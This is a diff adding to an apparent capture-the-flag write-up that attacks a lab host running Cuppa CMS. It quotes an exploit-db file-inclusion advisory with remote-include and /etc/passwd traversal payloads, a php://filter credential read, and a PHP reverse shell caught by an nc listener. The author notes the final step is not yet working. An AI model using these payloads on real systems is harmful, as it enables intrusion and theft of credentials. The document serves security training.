@@ -363,3 +363,168 @@ Bullseye! This talks about a hidden directory containing some sort of CMS. Check
 
 <img width="969" height="525" alt="grafik" src="https://github.com/user-attachments/assets/6f7837be-2b5b-407e-8ed7-3e2263fa511f" />
 
+Seems to be a simple static site. Too bad. Maybe we can find something with gobuster again.
+
+```
+root@ip-10-10-197-105:~# gobuster dir -u 10.10.210.136/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.210.136/45kra24zxs28v3yd
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/administrator        (Status: 301) [Size: 339] [--> http://10.10.210.136/45kra24zxs28v3yd/administrator/]
+/index.html           (Status: 200) [Size: 418]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+And yet again we find a directory, which will hopefully give us more ideas on how to move on from here.
+
+<img width="667" height="392" alt="grafik" src="https://github.com/user-attachments/assets/f32dd290-3e0b-470d-a3c7-ab38a30b763e" />
+
+Oh god, not another login page. Let it end! To see if there is some sort of exploit for this kind of Content Managament System I started googling for Cuppa CMS vulnerabilities and recognized that Remote File Inclusion would be a feasible way to read sensitive information. The exploit-db website had some beautiful source code that explains, what we can abuse
+
+```
+# Exploit Title   : Cuppa CMS File Inclusion
+# Date            : 4 June 2013
+# Exploit Author  : CWH Underground
+# Site            : www.2600.in.th
+# Vendor Homepage : http://www.cuppacms.com/
+# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
+# Version         : Beta
+# Tested on       : Window and Linux
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /          
+  / XXXXXX /
+ (________(            
+  `------'
+
+####################################
+VULNERABILITY: PHP CODE INJECTION
+####################################
+
+/alerts/alertConfigField.php (LINE: 22)
+
+-----------------------------------------------------------------------------
+LINE 22: 
+        <?php include($_REQUEST["urlConfig"]); ?>
+-----------------------------------------------------------------------------
+    
+
+#####################################################
+DESCRIPTION
+#####################################################
+
+An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+Moreover, We could access Configuration.php source code via PHPStream 
+
+For Example:
+-----------------------------------------------------------------------------
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+-----------------------------------------------------------------------------
+
+Base64 Encode Output:
+-----------------------------------------------------------------------------
+PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
+-----------------------------------------------------------------------------
+
+Base64 Decode Output:
+-----------------------------------------------------------------------------
+<?php 
+	class Configuration{
+		public $host = "localhost";
+		public $db = "cuppa";
+		public $user = "root";
+		public $password = "Db@dmin";
+		public $table_prefix = "cu_";
+		public $administrator_template = "default";
+		public $list_limit = 25;
+		public $token = "OBqIPqlFWf3X";
+		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
+		public $upload_default_path = "media/uploadsFiles";
+		public $maximum_file_size = "5242880";
+		public $secure_login = 0;
+		public $secure_login_value = "";
+		public $secure_login_redirect = "";
+	} 
+?>
+-----------------------------------------------------------------------------
+
+Able to read sensitive information via File Inclusion (PHP Stream)
+
+################################################################################################################
+ Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
+################################################################################################################            
+```
+
+Replacing *http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd* with the actual URL would be the first step in figuring out the limits on how we can abuse the system. We insert *http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd* and get the following output
+
+<img width="971" height="369" alt="grafik" src="https://github.com/user-attachments/assets/593c7319-2621-424e-ae45-ec67a727d7e6" />
+
+This worked out beautifully. We can use the same trick to display the user.txt. For that I just appended the following URL *http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt*
+
+<img width="332" height="108" alt="Bildschirmfoto vom 2025-11-17 19-28-46" src="https://github.com/user-attachments/assets/20dce57f-e634-4ea7-aa0b-09eb7b5d8446" />
+
+Now to get the final root.txt I realized manually traversing through directories with LFI wouldn't really take us far. What would maybe help us out now is hosting our own web server with our very own PHP reverse shell file that the vulnerable application could access. We make this possible by running a simple HTTP server on our attack machine
+
+```
+root@ip-10-10-197-105:~# php -S 10.10.197.105:8000
+[Mon Nov 17 18:54:29 2025] PHP 7.4.3-4ubuntu2.24 Development Server (http://10.10.197.105:8000) started
+```
+
+After that we can craft our LFI payload to include the URL of our reverse shell. In our instance the payload looked like this *http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.197.105:8000/php-reverse-shell.php*
+
+We also set up a netcat listener that was set up to catch the reverse shell connection on port 1337. With that we triggered the LFI payload and had a successful shell 
+
+```
+root@ip-10-10-197-105:~# nc -lvnp 1337
+Listening on 0.0.0.0 1337
+Connection received on 10.10.197.105 49916
+Linux ip-10-10-197-105 5.15.0-124-generic #134~20.04.1-Ubuntu SMP Tue Oct 1 15:27:33 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 18:55:16 up  3:48,  0 users,  load average: 0.04, 0.13, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=0(root) gid=0(root) groups=0(root),998(docker),1001(rvm)
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+```
+
+Now it was time to figure out where the root.txt file resides.
+
+```
+# find / -type f -name root.txt 2>dev/null
+/usr/share/wordlists/SecLists/Discovery/Web-Content/SVNDigger/context/root.txt
+```
+
+I realized this wasn't the text file we were looking for, so something clearly still isnt working its supposed to. 
